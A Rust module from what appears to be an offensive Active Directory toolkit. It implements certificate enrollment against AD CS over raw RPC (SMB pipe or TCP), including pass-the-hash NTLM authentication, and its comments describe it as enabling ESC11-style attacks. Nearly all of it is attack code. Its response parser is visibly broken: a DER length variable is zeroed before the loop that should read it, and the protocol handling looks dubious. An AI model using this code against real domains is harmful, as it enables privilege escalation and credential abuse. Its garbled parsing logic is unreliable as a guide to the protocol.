//! DCOM/RPC Certificate Request (ICertRequestD over MS-ICPR)
//!
//! Implements direct RPC-based certificate enrollment by calling the CA's
//! ICertRequestD interface over the `\PIPE\cert` SMB named pipe (MS-ICPR).
//! Bypasses HTTP CES/CEP endpoints entirely — useful when Web Enrollment is
//! disabled or restricted but the RPC endpoint is accessible.
//!
//! References:
//! - MS-ICPR: ICertPassage Protocol Specification
//! - ICertRequestD: d99e6e74-fc88-11d0-b498-00a0c90312f3

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::epm::{
    btf_read_frame, btf_write_frame, build_auth3_pdu, build_rpc_bind, build_rpc_bind_auth,
    build_rpc_request, build_rpc_request_auth, extract_auth_body, ndr_conformant_string,
    resolve_uuid_via_epm_tcp,
};
use overthrone_core::proto::smb::SmbSession;
use overthrone_core::proto::smb2::{
    build_ntlmssp_authenticate_hash, build_ntlmssp_negotiate, parse_ntlmssp_challenge,
};
use tokio::net::TcpStream;
use tracing::{debug, info};

/// NTLM credentials for authenticated RPC.
pub struct NtlmCredential<'a> {
    /// NetBIOS domain name
    pub domain: &'a str,
    /// Username (without domain prefix)
    pub username: &'a str,
    /// NT password hash (32 raw bytes, already decoded from hex)
    pub nt_hash: &'a [u8],
}

/// ICertRequestD interface UUID (little-endian byte order)
/// UUID: d99e6e74-fc88-11d0-b498-00a0c90312f3
pub const ICERTREQUEST_D_UUID: [u8; 16] = [
    0x74, 0x6e, 0x9e, 0xd9, 0x88, 0xfc, 0xd0, 0x11, 0xb4, 0x98, 0x00, 0xa0, 0xc9, 0x03, 0x12, 0xf3,
];

/// ICPR named pipe for certificate requests
pub const ICPR_NAMED_PIPE: &str = "cert";

/// ICertRequestD opnums
const OPNUM_REQUEST_CERTIFICATE: u16 = 1;
#[cfg_attr(not(test), allow(dead_code))]
const OPNUM_GET_CERTIFICATE: u16 = 2;

/// Request a certificate via raw RPC (ICertRequestD interface) over SMB named pipe.
///
/// This bypasses HTTP CES/CEP by calling directly over RPC on the CA's `\PIPE\cert`
/// named pipe. Requires an authenticated SMB session to the CA server.
///
/// # Arguments
/// * `smb` - Authenticated SMB session to the CA server
/// * `ca_name` - CA common name, e.g. "domain-CA"
/// * `template` - Certificate template name, e.g. "User"
/// * `subject` - Subject for the certificate, e.g. "CN=attacker"
/// * `csr_der` - PKCS#10 DER-encoded Certificate Signing Request
///
/// # Returns
/// Raw DER-encoded X.509 certificate bytes
pub async fn request_cert_via_rpc(
    smb: &SmbSession,
    ca_name: &str,
    template: &str,
    subject: &str,
    csr_der: &[u8],
) -> Result<Vec<u8>> {
    info!(
        "[ICertRequestD] Requesting cert via RPC: CA={}, template={}, subject={}",
        ca_name, template, subject
    );

    // 1. Bind to ICertRequestD on the ICPR named pipe
    let bind_req = build_rpc_bind(&ICERTREQUEST_D_UUID, 0, 0);
    let bind_resp = smb
        .pipe_transact(ICPR_NAMED_PIPE, &bind_req)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: format!("{}:cert", smb.target),
            reason: format!("ICertRequestD bind failed: {e}"),
        })?;

    if !overthrone_core::proto::epm::is_bind_accepted(&bind_resp) {
        return Err(OverthroneError::Rpc {
            target: format!("{}:cert", smb.target),
            reason: "ICertRequestD bind rejected".to_string(),
        });
    }
    debug!("[ICertRequestD] Bind accepted");

    // 2. Build the RequestCertificate stub data
    // RequestCertificate (opnum 1) takes:
    //   [in] handle_t hRpcCert (20-byte context handle)
    //   [in] wchar_t* pwszAuthority
    //   [in] DWORD dwFlags
    //   [in] DWORD dwRequestIdOffset (unused — pass 0)
    //   [in] CERTTRANSBLOB ctbRequest (size + data)
    //   [in] wchar_t* pwszAttributes
    //   [out] DWORD* pdwRequestId
    //   [out] DWORD* pdwDisposition (CERT_DISP_*)
    //   [out] CERTTRANSBLOB* pctbCertChain
    //   [out] DWORD* pdwEncodedDisposition

    // Build the NDR stub manually:
    let mut stub = Vec::new();

    // Context handle (20 bytes of zeros for first call — server returns real handle)
    stub.extend_from_slice(&[0u8; 20]);

    // pwszAuthority — conformant string (CA name)
    stub.extend_from_slice(&ndr_conformant_string(ca_name));

    // dwFlags — use 0 (no flags)
    stub.extend_from_slice(&0u32.to_le_bytes());

    // dwRequestIdOffset — 0
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ctbRequest — CERTTRANSBLOB { cbCount, pbData }
    let count = csr_der.len() as u32;
    stub.extend_from_slice(&count.to_le_bytes()); // cbCount
    // pbData pointer (non-null, referent follows)
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pointer
    // Pad to 8-byte alignment before embedded array
    while stub.len() % 8 != 0 {
        stub.push(0);
    }
    // The data — NDR conformant array
    stub.extend_from_slice(&count.to_le_bytes()); // max count
    stub.extend_from_slice(&0u32.to_le_bytes()); // offset
    stub.extend_from_slice(&count.to_le_bytes()); // actual count
    stub.extend_from_slice(csr_der);

    // pwszAttributes — conformant string (can be empty)
    stub.extend_from_slice(&ndr_conformant_string(""));

    // Output arguments are referenced via unique pointers — provide space
    // (these will be filled by the server)
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pdwRequestId ptr
    stub.extend_from_slice(&0u32.to_le_bytes()); // requestId placeholder
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pdwDisposition ptr
    stub.extend_from_slice(&0u32.to_le_bytes()); // disposition placeholder
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pctbCertChain ptr
    // CERTTRANSBLOB output: cbCount + pbData pointer
    stub.extend_from_slice(&0u32.to_le_bytes()); // cbCount
    stub.extend_from_slice(&0u32.to_le_bytes()); // pbData (null/placeholder)
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pdwEncodedDisposition ptr
    stub.extend_from_slice(&0u32.to_le_bytes()); // encoded disposition placeholder

    // 3. Send RequestCertificate call
    let req = build_rpc_request(OPNUM_REQUEST_CERTIFICATE, &stub);
    let resp = smb
        .pipe_transact(ICPR_NAMED_PIPE, &req)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: format!("{}:cert", smb.target),
            reason: format!("RequestCertificate failed: {e}"),
        })?;

    // 4. Parse response
    parse_icertrequest_response(&resp, ca_name)
}

/// Request a certificate via raw RPC using a fresh SMB connection.
/// Convenience wrapper that creates the SMB session, calls `request_cert_via_rpc`,
/// and tears down the session.
#[allow(clippy::too_many_arguments)]
pub async fn request_cert_via_rpc_with_creds(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    ca_name: &str,
    template: &str,
    subject: &str,
    csr_der: &[u8],
) -> Result<Vec<u8>> {
    let smb = SmbSession::connect(target, domain, username, password)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: target.to_string(),
            reason: format!("SMB connect failed: {e}"),
        })?;

    request_cert_via_rpc(&smb, ca_name, template, subject, csr_der).await
}

/// Request a certificate via TCP RPC (direct connection, no SMB named pipe).
///
/// Uses EPM to resolve the ICertRequestD interface UUID to a TCP endpoint,
/// then connects directly and submits the PKCS#10 CSR over DCE/RPC.
/// This is the native Windows AD CS enrollment protocol — no HTTP CES/CEP needed.
///
/// **Note on authentication:** The current implementation sends an unauthenticated
/// RPC bind request. For production AD CS, the CA typically requires authenticated
/// RPC (NTLM or Kerberos). This function is suitable for:
/// - ESC11-style attacks where the CA has `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\CertificateServices\ICPR\Security` set to allow anonymous
/// - Testing and development environments
/// - As a building block for authenticated RPC (add NTLM auth in the `auth_verifier`
///   of the bind PDU using `smb2::build_ntlmssp_negotiate()` etc.)
///
/// # Arguments
/// * `ca_host` - CA server hostname or IP
/// * `ca_name` - CA common name, e.g. "domain-CA"
/// * `template` - Certificate template name, e.g. "User"
/// * `subject` - Subject for the certificate, e.g. "CN=attacker"
/// * `csr_der` - PKCS#10 DER-encoded Certificate Signing Request
///
/// # Returns
/// Raw DER-encoded X.509 certificate bytes
pub async fn request_cert_via_tcp_rpc(
    ca_host: &str,
    ca_name: &str,
    _template: &str,
    _subject: &str,
    csr_der: &[u8],
) -> Result<Vec<u8>> {
    info!(
        "[ICertRequestD/TCP] Requesting cert via TCP RPC: CA={}, host={}",
        ca_name, ca_host
    );

    let (_resolved_host, port) = resolve_uuid_via_epm_tcp(ca_host, &ICERTREQUEST_D_UUID).await?;

    let addr = format!("{}:{}", ca_host, port);
    debug!("[ICertRequestD/TCP] Connecting to {addr}");

    let mut stream = TcpStream::connect(&addr)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: addr.clone(),
            reason: format!("TCP connect failed: {e}"),
        })?;

    let bind_req = build_rpc_bind(&ICERTREQUEST_D_UUID, 0, 0);
    btf_write_frame(&mut stream, &bind_req).await?;

    let bind_resp = btf_read_frame(&mut stream).await?;
    if !overthrone_core::proto::epm::is_bind_accepted(&bind_resp) {
        return Err(OverthroneError::Rpc {
            target: addr,
            reason: "ICertRequestD TCP bind rejected".to_string(),
        });
    }
    debug!("[ICertRequestD/TCP] Bind accepted");

    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 20]);
    stub.extend_from_slice(&ndr_conformant_string(ca_name));
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    let count = csr_der.len() as u32;
    stub.extend_from_slice(&count.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    while stub.len() % 8 != 0 {
        stub.push(0);
    }
    stub.extend_from_slice(&count.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&count.to_le_bytes());
    stub.extend_from_slice(csr_der);
    stub.extend_from_slice(&ndr_conformant_string(""));
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());

    let req = build_rpc_request(OPNUM_REQUEST_CERTIFICATE, &stub);
    btf_write_frame(&mut stream, &req).await?;
    let resp = btf_read_frame(&mut stream).await?;

    parse_icertrequest_response(&resp, ca_name)
}

/// Request a certificate via TCP RPC with NTLM authentication.
///
/// Performs the NTLM authentication handshake over DCE/RPC (bind with NTLMSSP
/// Type 1, receive Type 2 challenge, send AUTH3 with Type 3), then issues the
/// certificate enrollment request on the authenticated RPC channel.
///
/// This enables ESC11-style attacks against AD CS with NTLM authentication
/// (as opposed to anonymous/unauth only).
///
/// # Arguments
/// * `ca_host` - CA server hostname or IP
/// * `ca_name` - CA common name, e.g. "domain-CA"
/// * `template` - Certificate template name, e.g. "User"
/// * `subject` - Subject for the certificate, e.g. "CN=attacker"
/// * `csr_der` - PKCS#10 DER-encoded Certificate Signing Request
/// * `cred` - NTLM credentials (domain, username, NT hash)
///
/// # Returns
/// Raw DER-encoded X.509 certificate bytes
pub async fn request_cert_via_tcp_rpc_auth(
    ca_host: &str,
    ca_name: &str,
    _template: &str,
    _subject: &str,
    csr_der: &[u8],
    cred: &NtlmCredential<'_>,
) -> Result<Vec<u8>> {
    info!(
        "[ICertRequestD/TCP+NTLM] Requesting cert via authenticated TCP RPC: CA={}, host={}",
        ca_name, ca_host
    );

    let (_resolved_host, port) = resolve_uuid_via_epm_tcp(ca_host, &ICERTREQUEST_D_UUID).await?;

    let addr = format!("{}:{}", ca_host, port);
    debug!("[ICertRequestD/TCP+NTLM] Connecting to {addr}");

    let mut stream = TcpStream::connect(&addr)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: addr.clone(),
            reason: format!("TCP connect failed: {e}"),
        })?;

    // ── Step 1: Bind with NTLMSSP Type 1 (Negotiate) ──
    let ntlmssp_type1 = build_ntlmssp_negotiate();
    let bind_req = build_rpc_bind_auth(
        &ICERTREQUEST_D_UUID,
        0,
        0,
        Some(&ntlmssp_type1),
        2, // RPC_C_AUTHN_LEVEL_CONNECT
    );
    btf_write_frame(&mut stream, &bind_req).await?;

    let bind_resp = btf_read_frame(&mut stream).await?;
    if !overthrone_core::proto::epm::is_bind_accepted(&bind_resp) {
        return Err(OverthroneError::Rpc {
            target: addr,
            reason: "ICertRequestD TCP bind rejected (with NTLM auth)".to_string(),
        });
    }

    // ── Step 2: Extract NTLMSSP Type 2 (Challenge) from bind_ack auth verifier ──
    let challenge_bytes = extract_auth_body(&bind_resp).ok_or_else(|| {
        OverthroneError::Ntlm("Bind_ack missing NTLMSSP challenge in auth verifier".to_string())
    })?;

    let challenge = parse_ntlmssp_challenge(challenge_bytes)?;

    // ── Step 3: Build NTLMSSP Type 3 (Authenticate) ──
    let (type3, _session_key, _session_base_key) =
        build_ntlmssp_authenticate_hash(cred.domain, cred.username, cred.nt_hash, &challenge)?;

    // ── Step 4: Send AUTH3 PDU with Type 3 ──
    let auth3 = build_auth3_pdu(&type3, 2);
    btf_write_frame(&mut stream, &auth3).await?;

    // No response expected for AUTH3 (RFC accepted silently).

    // ── Step 5: Build and send the certificate enrollment request ──
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 20]);
    stub.extend_from_slice(&ndr_conformant_string(ca_name));
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    let count = csr_der.len() as u32;
    stub.extend_from_slice(&count.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    while stub.len() % 8 != 0 {
        stub.push(0);
    }
    stub.extend_from_slice(&count.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&count.to_le_bytes());
    stub.extend_from_slice(csr_der);
    stub.extend_from_slice(&ndr_conformant_string(""));
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());

    let req = build_rpc_request_auth(
        OPNUM_REQUEST_CERTIFICATE,
        &stub,
        None, // CONNECT level auth — no verifier needed on request PDU
        0,
    );
    btf_write_frame(&mut stream, &req).await?;
    let resp = btf_read_frame(&mut stream).await?;

    parse_icertrequest_response(&resp, ca_name)
}

/// Parse the ICertRequestD response to extract the certificate DER bytes.
pub fn parse_icertrequest_response(resp: &[u8], _ca_name: &str) -> Result<Vec<u8>> {
    if resp.len() < 24 {
        return Err(OverthroneError::CertificateRequest(
            "Response too short (no RPC header)".to_string(),
        ));
    }

    let stub_start = 24usize; // Skip RPC header (24 bytes for request response)

    // Parse output arguments in order:
    // 1. Return value (HRESULT) — DWORD at stub_start
    if stub_start + 4 > resp.len() {
        return Err(OverthroneError::CertificateRequest(
            "Response too short for status".to_string(),
        ));
    }
    let hresult = u32::from_le_bytes([
        resp[stub_start],
        resp[stub_start + 1],
        resp[stub_start + 2],
        resp[stub_start + 3],
    ]);

    // Check HRESULT — S_OK (0) means success
    // Common ADCS HRESULTs: CRYPT_E_REVOKED (0x80092010), CERTSRV_E_BAD_REQUESTSUBJECT (0x80094001)
    if hresult != 0 && hresult != 1 && hresult & 0x80000000 != 0 {
        return Err(OverthroneError::CertificateRequest(format!(
            "ICertRequestD returned HRESULT 0x{:08X}",
            hresult
        )));
    }

    // 2. pdwRequestId (DWORD at stub_start + 4)
    let _request_id = if stub_start + 8 <= resp.len() {
        Some(u32::from_le_bytes([
            resp[stub_start + 4],
            resp[stub_start + 5],
            resp[stub_start + 6],
            resp[stub_start + 7],
        ]))
    } else {
        None
    };

    // 3. pdwDisposition (DWORD at stub_start + 8)
    // CERT_DISP_ISSUED = 3, CERT_DISP_INCOMPLETE = 2, CERT_DISP_ERROR = 1, CERT_DISP_DENIED = 4
    let disposition = if stub_start + 12 <= resp.len() {
        u32::from_le_bytes([
            resp[stub_start + 8],
            resp[stub_start + 9],
            resp[stub_start + 10],
            resp[stub_start + 11],
        ])
    } else {
        0
    };

    debug!("[ICertRequestD] Disposition: {}", disposition);

    // Check disposition
    match disposition {
        1 => {
            return Err(OverthroneError::CertificateRequest(
                "Certificate request denied by CA".to_string(),
            ));
        }
        2 => {
            return Err(OverthroneError::CertificateRequest(
                "Certificate request pending (requires manager approval)".to_string(),
            ));
        }
        4 => {
            return Err(OverthroneError::CertificateRequest(
                "Certificate request denied by policy".to_string(),
            ));
        }
        _ => {
            // 3 = ISSUED, or unknown — try to parse cert chain
        }
    }

    // 4. pctbCertChain — find CERTTRANSBLOB in the response
    // After the returned arguments, scan for NDR conformant array patterns
    // that look like certificate data (DER typically starts with 0x30 0x82)
    for i in (stub_start + 24..resp.len().saturating_sub(8)).step_by(4) {
        // Look for DER certificate start marker preceded by array length
        if resp[i] == 0x30 && (resp[i + 1] & 0x80) != 0 {
            // Parse the DER length to determine total size
            let mut der_len = resp[i + 1] as usize & 0x7f;
            if (resp[i + 1] & 0x80) != 0 {
                der_len = 0;
                for j in 0..der_len.min(4) {
                    if i + 2 + j < resp.len() {
                        der_len = (der_len << 8) | resp[i + 2 + j] as usize;
                    }
                }
            }
            let total_size = der_len + 4; // tag + length + content
            if i + total_size <= resp.len() {
                let cert_der = resp[i..i + total_size].to_vec();
                info!(
                    "[ICertRequestD] Certificate obtained ({} bytes)",
                    cert_der.len()
                );
                return Ok(cert_der);
            }
        }
    }

    // Fallback: try to find certificate data by scanning for the DER blob
    // Search for the CERTTRANSBLOB.cbCount and matching data blob
    // The blob structure is: max_count(4) + offset(4) + actual_count(4) + data
    let mut i = stub_start + 16;
    while i + 12 < resp.len() {
        let max_count = u32::from_le_bytes([resp[i], resp[i + 1], resp[i + 2], resp[i + 3]]);
        let offset = u32::from_le_bytes([resp[i + 4], resp[i + 5], resp[i + 6], resp[i + 7]]);
        let actual = u32::from_le_bytes([resp[i + 8], resp[i + 9], resp[i + 10], resp[i + 11]]);

        // A reasonable cert blob: size between 200 and 50000 bytes, offset=0
        if offset == 0 && actual > 200 && actual < 50000 && max_count >= actual {
            let data_start = i + 12;
            if data_start + actual as usize <= resp.len() {
                // Verify it looks like DER: starts with 0x30 (SEQUENCE)
                if resp[data_start] == 0x30 {
                    let cert_der = resp[data_start..data_start + actual as usize].to_vec();
                    info!(
                        "[ICertRequestD] Certificate obtained via blob scan ({} bytes)",
                        cert_der.len()
                    );
                    return Ok(cert_der);
                }
            }
        }
        i += 4;
    }

    Err(OverthroneError::CertificateRequest(
        "Failed to extract certificate from ICertRequestD response".to_string(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_icertrequest_uuid() {
        // Verify UUID matches: d99e6e74-fc88-11d0-b498-00a0c90312f3
        let expected = [
            0x74, 0x6e, 0x9e, 0xd9, 0x88, 0xfc, 0xd0, 0x11, 0xb4, 0x98, 0x00, 0xa0, 0xc9, 0x03,
            0x12, 0xf3,
        ];
        assert_eq!(ICERTREQUEST_D_UUID, expected);
    }

    #[test]
    fn test_parse_response_rejected() {
        // Simulated HRESULT 0x80094001 (CERTSRV_E_BAD_REQUESTSUBJECT)
        let mut resp = vec![0u8; 24];
        resp.extend_from_slice(&0x80094001u32.to_le_bytes());
        let result = parse_icertrequest_response(&resp, "test-CA");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("HRESULT"));
    }

    #[test]
    fn test_parse_response_short() {
        let result = parse_icertrequest_response(&[0u8; 10], "test-CA");
        assert!(result.is_err());
    }

    #[test]
    fn test_opnum_constants() {
        assert_eq!(OPNUM_REQUEST_CERTIFICATE, 1);
        assert_eq!(OPNUM_GET_CERTIFICATE, 2);
    }

    #[test]
    fn test_tcp_rpc_stub_encoding_matches_smb() {
        let csr = vec![0x30u8; 256];
        let ca_name = "test-CA";
        let _subject = "CN=attacker";

        let mut stub_tcp = Vec::new();
        stub_tcp.extend_from_slice(&[0u8; 20]);
        stub_tcp.extend_from_slice(&ndr_conformant_string(ca_name));
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        let count = csr.len() as u32;
        stub_tcp.extend_from_slice(&count.to_le_bytes());
        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
        while stub_tcp.len() % 8 != 0 {
            stub_tcp.push(0);
        }
        stub_tcp.extend_from_slice(&count.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        stub_tcp.extend_from_slice(&count.to_le_bytes());
        stub_tcp.extend_from_slice(&csr);
        stub_tcp.extend_from_slice(&ndr_conformant_string(""));
        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
        stub_tcp.extend_from_slice(&0u32.to_le_bytes());

        let req_tcp = build_rpc_request(OPNUM_REQUEST_CERTIFICATE, &stub_tcp);

        assert_eq!(req_tcp[0], 5);
        assert_eq!(req_tcp[1], 0);
        assert_eq!(req_tcp[2], 0);
        assert!(req_tcp.len() > 100);
    }
}
